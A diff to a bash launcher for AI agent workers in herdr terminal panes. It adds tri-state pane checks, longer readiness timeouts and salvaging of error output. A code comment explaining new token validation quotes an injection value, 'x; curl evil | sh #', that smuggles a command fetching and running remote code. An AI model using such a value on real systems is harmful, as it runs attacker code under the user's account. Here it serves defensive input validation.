@@ -223,7 +223,11 @@ detect_launch_api() {
 # Bounds for the modern path. All overridable so tests stay hermetic and fast.
 START_TIMEOUT_MS="${WORK_SYSTEM_HERDR_START_TIMEOUT_MS:-30000}"  # herdr's own readiness wait
 BUSY_TRIES="${WORK_SYSTEM_HERDR_BUSY_TRIES:-20}"                 # agent_pane_busy retries
-READY_TRIES="${WORK_SYSTEM_HERDR_READY_TRIES:-20}"               # shell-prompt wait (pane-run)
+# The shell-prompt wait (pane-run) has to cover a real login shell's rc files —
+# nvm/sdkman/conda/direnv+sops routinely run 10-20s — because a still-busy shell at
+# the end of the window is a hard failure here. Budgeted to ~30s so it is comparable
+# to what the native path effectively gets (herdr's own --timeout 30000 per try).
+READY_TRIES="${WORK_SYSTEM_HERDR_READY_TRIES:-60}"               # shell-prompt wait (pane-run)
 DETECT_TRIES="${WORK_SYSTEM_HERDR_DETECT_TRIES:-60}"             # wrapper detection polls
 RETRY_DELAY="${WORK_SYSTEM_HERDR_RETRY_DELAY:-0.5}"              # seconds between polls
 # Legacy path only: how long to let a wrapper worker prove it did not die on the
@@ -251,11 +255,19 @@ except Exception:
 #   text sent then can be eaten. `unknown` when the answer cannot be read at all
 #   (older herdr without process-info), which the caller degrades on rather than
 #   blocking a launch forever.
+#   `busy` is only ever printed on a POSITIVELY parsed answer — both ids present
+#   and different. A missing/renamed field is schema drift, not a busy shell, and
+#   must read as `unknown` (→ the caller waits out its window and proceeds); mapping
+#   drift to `busy` would hard-fail and roll back every wrapper launch the day herdr
+#   renames a key.
 extract_shell_ready='import sys, json
 try:
     pi = json.load(sys.stdin)["result"]["process_info"]
     fg, shell = pi.get("foreground_process_group_id"), pi.get("shell_pid")
-    print("ready" if (fg is not None and fg == shell) else "busy")
+    if fg is None or shell is None:
+        print("unknown")
+    else:
+        print("ready" if fg == shell else "busy")
 except Exception:
     print("unknown")'
 extract_moved_tab='import sys, json
@@ -451,14 +463,32 @@ pane_agent_kind() {
   run_bounded 10 herdr pane get "$1" 2>/dev/null | python3 -c "$extract_pane_agent" 2>/dev/null || true
 }
 
-# pane_alive <pane> — does the pane still exist? Used on the LEGACY path, where a
+# pane_state <pane> → present | gone | unverified. Used on the LEGACY path, where a
 # wrapper worker IS the tab's root process: if its seed dies, the pane (and with it
 # the tab) is gone, and reporting `moved=yes` would point the user at a tab that no
-# longer exists. Non-zero when herdr cannot see the pane; also non-zero when herdr
-# cannot be reached at all, so the caller must treat "not alive" as inconclusive
-# unless it has another reason to believe the pane died.
-pane_alive() {
-  run_bounded 10 herdr pane get "$1" >/dev/null 2>&1
+# longer exists.
+#
+# TRI-state on purpose. "`herdr pane get` failed" conflates two opposite facts — the
+# pane is gone, or herdr just couldn't answer — and acting on the first when it was
+# the second declares a healthy worker dead, which sends the caller down its manual
+# path and invites a SECOND unattended worker onto the same worktree. So the check
+# reads the pane LIST instead: a populated list is evidence (present or genuinely
+# absent); an empty/failed/unparsable one is `unverified` and must never be reported
+# as death. Same shape, and same reasoning, as herdr-teardown.sh's tab lookups.
+extract_pane_present='import sys, json
+pid = sys.argv[1] if len(sys.argv) > 1 else ""
+try:
+    panes = json.load(sys.stdin)["result"]["panes"]
+except Exception:
+    print("unverified"); sys.exit(0)
+if not pid or not panes:
+    print("unverified"); sys.exit(0)
+print("present" if any(p.get("pane_id") == pid for p in panes) else "gone")'
+pane_state() {
+  local json
+  json="$(run_bounded 10 herdr pane list 2>/dev/null || true)"
+  [ -n "$json" ] || { printf 'unverified\n'; return 0; }
+  printf '%s' "$json" | python3 -c "$extract_pane_present" "$1" 2>/dev/null || printf 'unverified\n'
 }
 
 # pane_has_marker <pane> <token> — is the wrapper's seed-failure marker on screen?
@@ -527,6 +557,7 @@ case "$mode" in
     herdr_mode="agent-start"
     herdr_kind="claude"
     herdr_marker=""
+    herdr_marker_env=""
     if [ -z "$selector" ]; then
       # Plugin-qualified: a CC built-in/alias `/continue` shadows the skill.
       worker_argv=(claude -n "$session" "/work-system:continue")
@@ -552,7 +583,8 @@ case "$mode" in
           note=*)         note="${line#note=}" ;;
           herdr_mode=*)   herdr_mode="${line#herdr_mode=}" ;;
           herdr_kind=*)   herdr_kind="${line#herdr_kind=}" ;;
-          herdr_marker=*) herdr_marker="${line#herdr_marker=}" ;;
+          herdr_marker=*)     herdr_marker="${line#herdr_marker=}" ;;
+          herdr_marker_env=*) herdr_marker_env="${line#herdr_marker_env=}" ;;
         esac
       done <<EOF_RESOLVE
 $resolve_out
@@ -624,14 +656,32 @@ EOF_RESOLVE
         # this legacy contract is meant to stay byte-identical for them.
         if [ "$herdr_mode" = pane-run ]; then
           i=0
+          alive_state=unverified
           while [ "$i" -lt "$WRAPPER_ALIVE_TRIES" ]; do
             sleep "$RETRY_DELAY" 2>/dev/null || true
+            alive_state="$(pane_state "$pane")"
+            # `gone` is the answer we are watching for and it cannot un-happen, so
+            # stop at once. `present` keeps watching: the seed can still die inside
+            # the window, and only the LAST reading of a surviving pane is the one
+            # worth reporting.
+            [ "$alive_state" = gone ] && break
             i=$((i + 1))
           done
-          if ! pane_alive "$pane"; then
-            echo "the $agent_name worker exited immediately in pane $pane, so herdr closed its tab — the seed phase failed and TASK.md was not started (run the worker by hand to see its error)" >&2
-            exit 1
-          fi
+          case "$alive_state" in
+            gone)
+              echo "the $agent_name worker exited immediately in pane $pane, so herdr closed its tab — the seed phase failed and TASK.md was not started (run the worker by hand to see its error)" >&2
+              exit 1
+              ;;
+            unverified)
+              # herdr could not be read, so we do NOT know whether the worker is
+              # alive. Reporting a launch would be a guess; reporting a failure
+              # would send the caller down its manual path and risk a SECOND worker
+              # on this worktree. Fail closed instead: the tab exists, go look.
+              echo "could not verify whether the $agent_name worker is still running in pane $pane (herdr did not answer) — check the tab before launching anything else" >&2
+              emit_unverified
+              exit 0
+              ;;
+          esac
         fi
         printf 'pane=%s\ntab=%s\nmoved=yes\nagent=%s\n' "$pane" "$tab" "$agent_name"
       else
@@ -775,11 +825,23 @@ EOF_RESOLVE
     # ($WORK_SYSTEM_HERDR_SEED_TOKEN pins it for tests — a stubbed pane can only
     # echo a marker the test already knows. Never set it in real use.)
     seed_token="${WORK_SYSTEM_HERDR_SEED_TOKEN:-$(python3 -c 'import secrets; print(secrets.token_hex(8))' 2>/dev/null || true)}"
+    # The token is spliced UNQUOTED into a command string that a shell will execute,
+    # so it must be exactly what we think it is. `secrets.token_hex` always is —
+    # but the test override reads the ambient environment, and an inherited
+    # `…='x; curl evil | sh #'` would otherwise run in the worktree under the user's
+    # own account. Anything that is not plain lowercase hex is dropped (→ no marker
+    # detection), never sanitized into something "close enough".
+    case "$seed_token" in
+      ''|*[!0-9a-f]*) seed_token="" ;;
+    esac
     seed_marker_match=""
     run_cmd="$argv_shell"
-    if [ -n "$herdr_marker" ] && [ -n "$seed_token" ]; then
+    if [ -n "$herdr_marker" ] && [ -n "$herdr_marker_env" ] && [ -n "$seed_token" ]; then
       seed_marker_match="$herdr_marker:$seed_token"
-      run_cmd="WORK_SYSTEM_SEED_TOKEN=$seed_token $argv_shell"
+      # The env var NAME comes from the registry alongside the marker: both halves
+      # of this contract are declared in one place, so a rename there cannot leave
+      # the wrapper printing `:none` while the launcher greps for a nonce.
+      run_cmd="$herdr_marker_env=$seed_token $argv_shell"
     fi
     run_rc=0
     run_err="$(mktemp)"
@@ -818,6 +880,15 @@ EOF_RESOLVE
     i=0
     while [ "$i" -lt "$DETECT_TRIES" ]; do
       if [ -n "$seed_marker_match" ] && pane_has_marker "$pane" "$seed_marker_match"; then
+        # Rolling the tab back also destroys the pane holding the WORKER'S OWN error
+        # (expired auth, an unconfigured model — the thing the user actually needs).
+        # So salvage the visible text first and relay it: without this the user is
+        # told the seed failed and given no way left to find out why.
+        seed_out="$(run_bounded 10 herdr pane read "$pane" --source visible --lines 40 --format text 2>/dev/null \
+          | tr -dc '[:print:]\t\n' | tail -20 || true)"
+        if [ -n "$seed_out" ]; then
+          printf 'the failing pane said:\n%s\n' "$seed_out" >&2
+        fi
         fail_definitive "the $agent_name worker's seed phase failed in pane $pane (marker: $herdr_marker) — TASK.md was not started"
       fi
       detected="$(pane_agent_kind "$pane")"
